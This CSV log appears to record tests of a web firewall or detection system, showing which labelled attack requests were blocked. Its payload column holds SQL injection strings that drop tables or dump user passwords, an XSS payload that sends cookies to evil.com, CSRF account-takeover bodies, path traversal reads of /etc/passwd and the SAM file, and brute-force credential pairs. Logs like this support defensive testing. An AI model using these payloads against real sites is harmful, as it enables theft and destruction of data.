timestamp,attack_type,payload_snippet,label,status_code,blocked
2026-07-05T13:13:30.364018,sqli,' AND 1=2--,1,403,True
2026-07-05T13:13:30.537180,sqli,'; DROP TABLE users--,1,401,False
2026-07-05T13:13:33.021525,sqli,' AND 1=2--,1,403,True
2026-07-05T13:13:35.540560,sqli,' OR '1'='1,1,403,True
2026-07-05T13:13:36.352687,sqli,' AND 1=2--,1,403,True
2026-07-05T13:13:38.842104,sqli,1' OR '1'='1' /*,1,403,True
2026-07-05T13:13:41.139148,sqli,"1' UNION SELECT username,password,email FROM users--",1,403,True
2026-07-05T13:13:43.426743,sqli,"1' UNION SELECT username,password,email FROM users--",1,403,True
2026-07-05T13:13:44.217203,sqli,'; DELETE FROM products WHERE 1=1--,1,403,True
2026-07-05T13:13:46.440040,sqli,"1' UNION SELECT username,password,email FROM users--",1,403,True
2026-07-05T13:13:48.821476,sqli,'; DROP TABLE users--,1,403,True
2026-07-05T13:13:51.090930,sqli,' OR '1'='1,1,403,True
2026-07-05T13:13:53.517466,sqli,"1' UNION SELECT username,password,email FROM users--",1,403,True
2026-07-05T13:13:56.005489,sqli,' AND 1=2--,1,403,True
2026-07-05T13:13:58.616447,sqli,' OR '1'='1,1,403,True
2026-07-05T13:13:58.984662,benign,normal_request,0,200,False
2026-07-05T13:14:04.376390,benign,normal_request,0,N/A,False
2026-07-05T13:14:05.886237,benign,normal_request,0,403,False
2026-07-05T13:14:06.599063,benign,normal_request,0,403,False
2026-07-05T13:14:06.852022,benign,normal_request,0,200,False
2026-07-05T13:14:07.284734,benign,normal_request,0,200,False
2026-07-05T13:14:11.647052,benign,normal_request,0,403,False
2026-07-05T13:14:14.449389,benign,normal_request,0,403,False
2026-07-05T13:14:14.698442,benign,normal_request,0,200,False
2026-07-05T13:14:15.102993,benign,normal_request,0,200,False
2026-07-05T13:14:18.999330,xss,<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>,1,403,True
2026-07-05T13:14:19.599569,xss,<script>alert(document.cookie)</script>,1,403,True
2026-07-05T13:14:23.712023,xss,<script>alert(document.cookie)</script>,1,403,True
2026-07-05T13:14:27.561378,xss,<div onmouseover=alert(1)>hover</div>,1,403,True
2026-07-05T13:14:31.724309,xss,<a href='javascript:alert(1)'>click</a>,1,403,True
2026-07-05T13:14:32.409462,xss,<a href='javascript:alert(1)'>click</a>,1,403,True
2026-07-05T13:14:36.229344,xss,<scr<script>ipt>alert(1)</scr</script>ipt>,1,403,True
2026-07-05T13:14:40.177176,xss,<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>,1,403,True
2026-07-05T13:14:43.924454,xss,<svg onload=alert(1)>,1,403,True
2026-07-05T13:14:44.684651,xss,<script>alert(document.cookie)</script>,1,403,True
2026-07-05T13:14:48.630219,xss,<a href='javascript:alert(1)'>click</a>,1,403,True
2026-07-05T13:14:52.597650,xss,<script>alert(document.cookie)</script>,1,403,True
2026-07-05T13:14:56.561893,benign,normal_request,0,403,False
2026-07-05T13:15:00.864967,benign,normal_request,0,403,False
2026-07-05T13:15:02.090318,benign,normal_request,0,403,False
2026-07-05T13:15:06.169102,benign,normal_request,0,403,False
2026-07-05T13:15:11.964563,benign,normal_request,0,N/A,False
2026-07-05T13:15:16.291010,benign,normal_request,0,403,False
2026-07-05T13:15:19.293020,benign,normal_request,0,403,False
2026-07-05T13:15:19.672756,benign,normal_request,0,200,False
2026-07-05T13:15:23.787397,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,403,True
2026-07-05T13:15:24.722762,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,403,True
2026-07-05T13:15:28.864155,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,403,True
2026-07-05T13:15:29.852296,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,403,True
2026-07-05T13:15:34.016515,csrf,"{""action"": ""transfer_funds"", ""amount"": 5000, ""to"": ""attacker""}",1,403,True
2026-07-05T13:15:36.264118,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,403,True
2026-07-05T13:15:40.440735,csrf,"{""action"": ""change_password"", ""new_password"": ""hacked123""}",1,403,True
2026-07-05T13:15:44.424774,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,403,True
2026-07-05T13:15:48.453483,csrf,"{""action"": ""delete_user"", ""user_id"": 123}",1,403,True
2026-07-05T13:15:52.997041,csrf,"{""action"": ""update_email"", ""email"": ""attacker@evil.com""}",1,403,True
2026-07-05T13:15:53.201894,benign,normal_request,0,401,False
2026-07-05T13:15:53.903097,benign,normal_request,0,401,False
2026-07-05T13:15:54.203941,benign,normal_request,0,200,False
2026-07-05T13:15:54.602312,benign,normal_request,0,200,False
2026-07-05T13:15:55.166100,benign,normal_request,0,200,False
2026-07-05T13:15:59.165659,benign,normal_request,0,403,False
2026-07-05T13:16:01.588865,path_traversal,../../../etc/passwd,1,403,True
2026-07-05T13:16:05.309243,path_traversal,/var/www/../../etc/passwd,1,403,True
2026-07-05T13:16:05.995739,path_traversal,....//....//....//etc/passwd,1,403,True
2026-07-05T13:16:09.893943,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,403,True
2026-07-05T13:16:14.380742,path_traversal,..\..\..\windows\system32\config\sam,1,403,True
2026-07-05T13:16:16.576477,path_traversal,../../../etc/passwd,1,403,True
2026-07-05T13:16:20.377772,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,403,True
2026-07-05T13:16:24.452282,path_traversal,..%252f..%252f..%252fetc%252fpasswd,1,403,True
2026-07-05T13:16:26.871484,path_traversal,/var/www/../../etc/passwd,1,403,True
2026-07-05T13:16:26.974751,path_traversal,%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,1,500,False
2026-07-05T13:16:31.151853,benign,normal_request,0,403,False
2026-07-05T13:16:31.944650,benign,normal_request,0,401,False
2026-07-05T13:16:32.447146,benign,normal_request,0,401,False
2026-07-05T13:16:32.809425,benign,normal_request,0,401,False
2026-07-05T13:16:33.060376,benign,normal_request,0,200,False
2026-07-05T13:16:37.093580,benign,normal_request,0,403,False
2026-07-05T13:16:37.841030,benign,normal_request,0,403,False
2026-07-05T13:16:41.692308,benign,normal_request,0,403,False
2026-07-05T13:16:45.800181,brute_force,administrator:admin123,1,403,True
2026-07-05T13:16:46.304198,brute_force,administrator:password,1,403,True
2026-07-05T13:16:47.016127,brute_force,root:Admin@123,1,403,True
2026-07-05T13:16:47.697224,brute_force,user:Admin@123,1,403,True
